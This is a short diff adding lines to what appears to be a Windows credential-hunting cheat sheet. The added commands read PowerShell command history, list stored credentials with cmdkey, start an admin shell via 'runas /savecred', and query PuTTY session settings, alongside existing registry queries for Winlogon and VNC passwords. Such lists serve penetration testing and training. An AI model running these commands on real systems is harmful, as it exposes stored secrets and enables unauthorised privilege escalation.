@@ -72,6 +72,16 @@ findstr /spin "password" *.*
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+cmdkey /list
+
+#use saved credentials
+runas /savecred /user:admin cmd.exe
+
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
 ```
 
 
